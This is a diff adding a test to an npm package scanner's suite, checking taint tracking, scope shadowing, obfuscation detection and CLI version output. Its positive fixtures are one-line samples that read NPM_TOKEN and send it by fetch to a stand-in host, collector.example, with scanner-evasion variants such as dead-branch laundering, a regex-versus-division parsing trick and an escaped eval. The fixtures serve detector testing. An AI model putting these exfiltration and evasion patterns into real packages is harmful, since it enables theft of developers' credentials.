@@ -1534,4 +1534,287 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
     );
     assert.ok(negOut.includes("NEGATIVE_PACK_OK"));
   });
+
+  it("enforces lexical taint scoping, parameter shadowing, clean-redeclaration kill, benign env-alias reads, non-regex Unicode RegExp tolerance, dense escape detection, and CLI --version/-V", async () => {
+    // 1. Esbuild-style bundled file (prettier@3.5.3 regression):
+    //    Module A reads `var env2 = process.env;` + benign color/debug/npm vars + local tainted `url2`,
+    //    and top-level also declares tainted `url2` & `specifier`; Module B shadows params & cleanly re-declares `url2`.
+    //    MUST NOT emit TAINT_CRED_TO_NETWORK_OR_EXEC (dynamic import(url2) emits HIGH OBFUSCATED_DYNAMIC_EXEC -> QUARANTINE_SUSPICIOUS, NOT MALICIOUS_INDICATORS_FOUND).
+    const esbuildBundleTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "bundled-parser-cli", version: "3.5.3", license: "MIT" }) },
+      {
+        name: "package/index.mjs",
+        content: `
+          var __commonJS = (cb, mod) => () => (mod || cb((mod = { exports: {} }).exports, mod), mod.exports);
+          var require_supports_color = __commonJS({
+            "node_modules/supports-color/index.js"(exports, module) {
+              var env2 = process.env;
+              const c = env2.FORCE_COLOR || env2.NO_COLOR || env2.TERM || env2.COLORTERM || env2.NODE_DEBUG || env2.npm_package_name || env2.npm_lifecycle_script;
+              const hasNoColor = "NO_COLOR" in env2;
+              const guarded = env2 && env2.FORCE_COLOR;
+              var url2 = env2.CUSTOM_INTERNAL_ENDPOINT;
+              var parent = env2.CUSTOM_PARENT_VAL;
+              module.exports = { c, hasNoColor, guarded, url2, parent };
+            }
+          });
+          var url2 = process.env.OUTER_SENSITIVE_URL, specifier = process.env.OUTER_SPEC;
+          function resolve2(s, p) { return s + p; }
+          function pathToFileURL4(p) { return { href: "file://" + p }; }
+          function importFromFile(specifier, parent) {
+            const url2 = resolve2(specifier, pathToFileURL4(parent).href);
+            return import(url2);
+          }
+          export { require_supports_color, importFromFile };
+        `,
+      },
+    ]);
+    const esUnpack = await unpackTarballInMemory(esbuildBundleTgz, DEFAULT_POLICY);
+    const esTriage = triageUnpackedEntries(esUnpack.entries, DEFAULT_POLICY);
+    assert.equal(
+      esTriage.observations.some((o) => o.code === "TAINT_CRED_TO_NETWORK_OR_EXEC"),
+      false,
+      `Bundled importFromFile must NOT emit TAINT_CRED_TO_NETWORK_OR_EXEC: ${JSON.stringify(esTriage.observations)}`,
+    );
+    assert.ok(
+      esTriage.observations.some((o) => o.code === "OBFUSCATED_DYNAMIC_EXEC" && o.severity === "HIGH"),
+      "Computed import(url2) should still emit HIGH OBFUSCATED_DYNAMIC_EXEC",
+    );
+    const esReport = assembleInspectionReport({
+      package_name: "bundled-parser-cli",
+      version: "3.5.3",
+      org_or_scope: "unscoped",
+      creator: "dev",
+      category_tags: [],
+      summary: "bundled parser",
+      license: "MIT",
+      bin_names: [],
+      unpack: esUnpack,
+      triage: esTriage,
+      parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
+      advisories: [],
+      registryObservations: [],
+      registryUnknowns: [],
+      policy: DEFAULT_POLICY,
+      host_capabilities: DUMMY_CAPS,
+      cwd: tmpdir(),
+    });
+    assert.equal(esReport.verdict, "QUARANTINE_SUSPICIOUS");
+
+    // 2. Closure-captured taint, shadowed-param negative vs positive, clean re-declaration, branch-launder resistance,
+    //    try-block outer taint propagation, comma-list non-bleeding, and env-alias benign vs sensitive reads.
+    const scopeMatrixTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "scope-matrix", version: "1.0.0", license: "MIT" }) },
+      // Positive: genuine closure-captured taint MUST STILL emit CRITICAL TAINT_CRED_TO_NETWORK_OR_EXEC
+      {
+        name: "package/pos-closure.js",
+        content: 'const tok = process.env.NPM_TOKEN; function send() { fetch("https://collector.example", { body: tok }); } send();',
+      },
+      // Positive: shadowed param wrapper called with tainted outer var MUST STILL emit CRITICAL
+      {
+        name: "package/pos-shadow-wrapper-call.js",
+        content: 'const tok = process.env.NPM_TOKEN; function send(tok) { fetch("https://collector.example", { body: tok }); } send(tok);',
+      },
+      // Positive: sensitive property off env alias MUST STILL emit CRITICAL
+      {
+        name: "package/pos-env-alias-secret.js",
+        content: 'var env2 = process.env; const s = env2.NPM_TOKEN; fetch("https://collector.example", { body: s });',
+      },
+      // Positive: whole env alias passed directly to sink MUST STILL emit CRITICAL
+      {
+        name: "package/pos-env-alias-whole.js",
+        content: 'var env2 = process.env; fetch("https://collector.example", { body: env2 });',
+      },
+      // Positive: conditional branch clean reassignment MUST NOT launder outer taint
+      {
+        name: "package/pos-branch-launder.js",
+        content: 'let tok = process.env.NPM_TOKEN; if (false) { tok = "clean"; } fetch("https://collector.example", { body: tok });',
+      },
+      // Positive: try-block reassignment to outer declared var MUST propagate taint after try exits
+      {
+        name: "package/pos-try-outer-reassign.js",
+        content: 'let stolen = ""; try { stolen = process.env.NPM_TOKEN; } catch {} fetch("https://collector.example", { body: stolen });',
+      },
+      // Positive: block-scoped clean shadow MUST restore outer tainted var after block closes
+      {
+        name: "package/pos-block-restore.js",
+        content: 'const tok = process.env.NPM_TOKEN; { const tok = "clean"; console.log(tok); } fetch("https://collector.example", { body: tok });',
+      },
+      // Negative: shadowed function param called with clean value MUST NOT emit taint
+      {
+        name: "package/neg-shadow-param.js",
+        content: 'const tok = process.env.NPM_TOKEN; function send(tok) { fetch("https://registry.npmjs.org", { body: tok }); } send("ok");',
+      },
+      // Negative: expression-body arrow shadowed param called cleanly MUST NOT emit taint
+      {
+        name: "package/neg-arrow-shadow.js",
+        content: 'const tok = process.env.NPM_TOKEN; const ping = (tok) => fetch("https://registry.npmjs.org", { body: tok }); ping("ok");',
+      },
+      // Negative: clean re-declaration / same-scope clean reassignment kills prior taint
+      {
+        name: "package/neg-clean-redecl.js",
+        content: 'let x = process.env.NPM_TOKEN; x = "clean"; fetch("https://registry.npmjs.org", { body: x }); { const tok = process.env.NPM_TOKEN; } const tok = "safe"; fetch("https://registry.npmjs.org", { body: tok });',
+      },
+      // Negative: benign env alias reads + comma-list non-bleeding MUST NOT emit taint
+      {
+        name: "package/neg-benign-env-alias.js",
+        content: 'var cleanA = "ok", env2 = process.env; const c = env2.NO_COLOR || env2.FORCE_COLOR || env2.NODE_DEBUG || env2.npm_package_name || env2.npm_lifecycle_script; fetch("https://registry.npmjs.org", { headers: { a: cleanA, c } });',
+      },
+      // Positive: destructuring defaults, nested RHS object/array literals, comma destructuring, nested env, globalThis.process
+      {
+        name: "package/pos-destr-default.js",
+        content: 'const { tok = process.env.NPM_TOKEN } = {}; fetch("https://collector.example", { body: tok });',
+      },
+      {
+        name: "package/pos-destr-arr-default.js",
+        content: 'const [tok = process.env.NPM_TOKEN] = []; fetch("https://collector.example", { body: tok });',
+      },
+      {
+        name: "package/pos-destr-rhs-multi.js",
+        content: 'const s = process.env.NPM_TOKEN; const { a, b } = { a: "safe", b: s }; fetch("https://collector.example", { body: b });',
+      },
+      {
+        name: "package/pos-destr-arr-multi.js",
+        content: 'const s = process.env.NPM_TOKEN; const [a, b] = ["safe", s]; fetch("https://collector.example", { body: b });',
+      },
+      {
+        name: "package/pos-comma-destr.js",
+        content: 'var a = 1, { NPM_TOKEN } = process.env; fetch("https://collector.example", { body: NPM_TOKEN });',
+      },
+      {
+        name: "package/pos-globalthis-destr.js",
+        content: 'const { env: { NPM_TOKEN } } = globalThis.process; fetch("https://collector.example", { body: NPM_TOKEN });',
+      },
+      // Positive: conditional / braceless / short-circuit clean reassignment MUST NOT launder taint
+      {
+        name: "package/pos-braceless-launder.js",
+        content: 'let tok = process.env.NPM_TOKEN; if (false) tok = "clean"; fetch("https://collector.example", { body: tok });',
+      },
+      {
+        name: "package/pos-shortcircuit-launder.js",
+        content: 'let tok = process.env.NPM_TOKEN; false && (tok = "clean"); fetch("https://collector.example", { body: tok });',
+      },
+      // Positive: regex-vs-division evasion (`x++ / 2`, `o.return / 2`) & leading-zero \u{000000000061} escape
+      {
+        name: "package/pos-div-evasion.js",
+        content: 'let x = 1; x++ / 2; fetch("https://collector.example", { body: process.env.NPM_TOKEN }); // /',
+      },
+      {
+        name: "package/pos-prop-div-evasion.js",
+        content: 'const o = { return: 4 }; o.return / 2; fetch("https://collector.example", { body: process.env.NPM_TOKEN }); // /',
+      },
+      {
+        name: "package/pos-leading-zero-uni.js",
+        content: 'ev\\u{000000000061}l("1+1");',
+      },
+      // Positive: var block arrow inside if-block returning taint
+      {
+        name: "package/pos-var-block-arrow.js",
+        content: 'if (true) { var getT = () => { return process.env.NPM_TOKEN; }; } fetch("https://collector.example", { body: getT() });',
+      },
+      // Negative: block-body arrow / function expression / chained arrow parameter colliding with outer tainted var
+      {
+        name: "package/neg-fn-expr-param.js",
+        content: 'const url2 = process.env.CUSTOM_URL; const r1 = (url2) => { return "/safe/" + url2; }; const r2 = function(url2) { return "/safe/" + url2; }; const r3 = (a) => (url2) => "/safe/" + url2; fetch("https://registry.npmjs.org", { body: r1("a") + r2("b") + r3("c")("d") });',
+      },
+      // Negative: object literal property keys colliding with env alias / tainted var, dynamic env[k] stringify, nested comma decl, braceless for-let, and module-scoped wrapper sinks
+      {
+        name: "package/neg-obj-key-and-scoped-wrappers.js",
+        content: 'var env = process.env; var path = process.env.CUSTOM_PATH; const cfg = { path: "/clean" }; fetch("https://registry.npmjs.org", { headers: { env: "prod" }, body: cfg }); const s1 = JSON.stringify({ env: "prod" }); const s2 = JSON.stringify(env && env.NO_COLOR); function d(k) { const v = env[k]; return JSON.stringify(v); } for (let tok = process.env.CUSTOM_X; false; ) console.log(tok); const fn = () => fetch("https://registry.npmjs.org", { body: tok }); var mA = __cjs({ "a.js"() { function send(x) { return fetch("https://a.example", { body: x }); } } }); var mB = __cjs({ "b.js"() { function send(x) { return console.log(x); } const s = process.env.CUSTOM_LOG; send(s); } });',
+      },
+    ]);
+    const smUnpack = await unpackTarballInMemory(scopeMatrixTgz, DEFAULT_POLICY);
+    const smTriage = triageUnpackedEntries(smUnpack.entries, DEFAULT_POLICY);
+    const smCodes = (f: string) => new Set(smTriage.observations.filter((o) => o.path === f).map((o) => o.code));
+
+    assert.ok(smCodes("pos-closure.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "closure-captured taint must be caught");
+    assert.ok(smCodes("pos-shadow-wrapper-call.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "wrapper call with tainted outer arg must be caught");
+    assert.ok(smCodes("pos-env-alias-secret.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "env2.NPM_TOKEN must be caught");
+    assert.ok(smCodes("pos-env-alias-whole.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "whole env2 in sink must be caught");
+    assert.ok(smCodes("pos-branch-launder.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "if (false) launder must not kill outer taint");
+    assert.ok(smCodes("pos-try-outer-reassign.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "try-block taint assignment to outer let must be caught");
+    assert.ok(smCodes("pos-block-restore.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "outer taint must survive after inner block shadow pops");
+    assert.ok(smCodes("pos-destr-default.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "object destructuring default taint must be caught");
+    assert.ok(smCodes("pos-destr-arr-default.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "array destructuring default taint must be caught");
+    assert.ok(smCodes("pos-destr-rhs-multi.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "multi-prop object destructuring RHS taint must be caught");
+    assert.ok(smCodes("pos-destr-arr-multi.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "multi-elem array destructuring RHS taint must be caught");
+    assert.ok(smCodes("pos-comma-destr.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "comma-list destructuring taint must be caught");
+    assert.ok(smCodes("pos-globalthis-destr.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "globalThis.process nested env destructuring must be caught");
+    assert.ok(smCodes("pos-braceless-launder.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "braceless if (false) tok = clean must not launder taint");
+    assert.ok(smCodes("pos-shortcircuit-launder.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "short-circuit false && (tok = clean) must not launder taint");
+    assert.ok(smCodes("pos-div-evasion.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "x++ / 2 must not swallow rest of line as regex");
+    assert.ok(smCodes("pos-prop-div-evasion.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "o.return / 2 must not swallow rest of line as regex");
+    assert.ok(smCodes("pos-leading-zero-uni.js").has("OBFUSCATED_DYNAMIC_EXEC"), "leading-zero \\u{000000000061} escape must be decoded");
+    assert.ok(smCodes("pos-var-block-arrow.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "var block arrow inside if-block returning taint must be caught");
+
+    assert.equal(smCodes("neg-shadow-param.js").size, 0, "shadowed param with clean call must have 0 findings");
+    assert.equal(smCodes("neg-arrow-shadow.js").size, 0, "arrow shadowed param with clean call must have 0 findings");
+    assert.equal(smCodes("neg-clean-redecl.js").size, 0, "same-scope clean reassignment / block exit must have 0 findings");
+    assert.equal(smCodes("neg-benign-env-alias.js").size, 0, "benign env alias props + comma decl must have 0 findings");
+    assert.equal(smCodes("neg-fn-expr-param.js").size, 0, "block-body arrow / function expr / chained arrow param shadowing must have 0 findings");
+    assert.equal(smCodes("neg-obj-key-and-scoped-wrappers.js").size, 0, "object keys, dynamic env[k] stringify, braceless for-let, and module-scoped wrapper sinks must have 0 findings");
+
+    // 3. Unicode RegExp parser table (220+ \uXXXX inside regex literals, incl. after `if (s)` and `{}` blocks -> VERIFIED_CLEAN_WITHIN_SCOPE)
+    //    vs dense \xXX / \uXXXX obfuscated string payloads (including comment-padded evasion -> HIGH_ENTROPY_OBFUSCATION)
+    const uniRanges = Array.from({ length: 120 }, (_, idx) => {
+      const a = (0x00c0 + idx * 4).toString(16).padStart(4, "0");
+      const b = (0x00c0 + idx * 4 + 2).toString(16).padStart(4, "0");
+      return `\\u${a}-\\u${b}`;
+    }).join("");
+    const parserCode = [
+      `const UNI_RE = /[${uniRanges}]/u;`,
+      `const UNI_RE2 = /[${uniRanges}]/g;`,
+      `export function checkMinified(s) { if (s) /[${uniRanges}]/u.test(s); if (s) { s = s.trim(); } /[${uniRanges}]/u.test(s); return s; }`,
+      ...Array.from({ length: 40 }, (_, i) => `export function parseNode${i}(src) { return UNI_RE.test(src) ? src.replace(UNI_RE2, "") : src; }`),
+    ].join("\n");
+    const benignParserTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "unicode-parser-cli", version: "1.0.0", license: "MIT" }) },
+      { name: "package/parser.js", content: parserCode },
+    ]);
+    const bpUnpack = await unpackTarballInMemory(benignParserTgz, DEFAULT_POLICY);
+    const bpTriage = triageUnpackedEntries(bpUnpack.entries, DEFAULT_POLICY);
+    assert.equal(bpTriage.observations.length, 0, `Unicode RegExp parser must have 0 findings: ${JSON.stringify(bpTriage.observations)}`);
+    assert.equal(bpTriage.has_obfuscation, false);
+
+    const denseHexStr = Array.from({ length: 90 }, (_, i) => `\\x${(65 + (i % 26)).toString(16)}`).join("");
+    const denseUniStr = Array.from({ length: 90 }, (_, i) => `\\u${(65 + (i % 26)).toString(16).padStart(4, "0")}`).join("");
+    const obfEscTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "esc-obf-pkg", version: "1.0.0", license: "MIT" }) },
+      { name: "package/hex-str.js", content: `${"// ".concat("a".repeat(80), "\n").repeat(80)}const p = "${denseHexStr}"; console.log(p);` },
+      { name: "package/uni-str.js", content: `const u = "${denseUniStr}"; console.log(u);` },
+    ]);
+    const oeUnpack = await unpackTarballInMemory(obfEscTgz, DEFAULT_POLICY);
+    const oeTriage = triageUnpackedEntries(oeUnpack.entries, DEFAULT_POLICY);
+    assert.ok(
+      oeTriage.observations.some((o) => o.path === "hex-str.js" && o.code === "HIGH_ENTROPY_OBFUSCATION"),
+      "Comment-padded dense \\xHH string payload must still trigger HIGH_ENTROPY_OBFUSCATION",
+    );
+    assert.ok(
+      oeTriage.observations.some((o) => o.path === "uni-str.js" && o.code === "HIGH_ENTROPY_OBFUSCATION"),
+      "Dense \\uHHHH string payload must still trigger HIGH_ENTROPY_OBFUSCATION",
+    );
+
+    // 4. CLI --version and -V flags exit 0 and print `coldpin v${ENGINE_VERSION}`
+    const cliPath = resolve("src/cli.ts");
+    const runCli = (args: string[]) =>
+      new Promise<{ code: number; stdout: string; stderr: string }>((res) => {
+        const p = spawn(process.execPath, ["--no-warnings", cliPath, ...args]);
+        let stdout = "";
+        let stderr = "";
+        p.stdout.on("data", (d) => (stdout += String(d)));
+        p.stderr.on("data", (d) => (stderr += String(d)));
+        p.on("close", (code) => res({ code: code ?? 1, stdout, stderr }));
+      });
+
+    const vLong = await runCli(["--version"]);
+    assert.equal(vLong.code, 0, vLong.stderr);
+    assert.equal(vLong.stdout.trim(), `coldpin v${ENGINE_VERSION}`);
+
+    const vShort = await runCli(["-V"]);
+    assert.equal(vShort.code, 0, vShort.stderr);
+    assert.equal(vShort.stdout.trim(), `coldpin v${ENGINE_VERSION}`);
+
+    const helpRes = await runCli(["--help"]);
+    assert.equal(helpRes.code, 0, helpRes.stderr);
+    assert.ok(helpRes.stdout.includes("--version, -V"));
+  });
 });
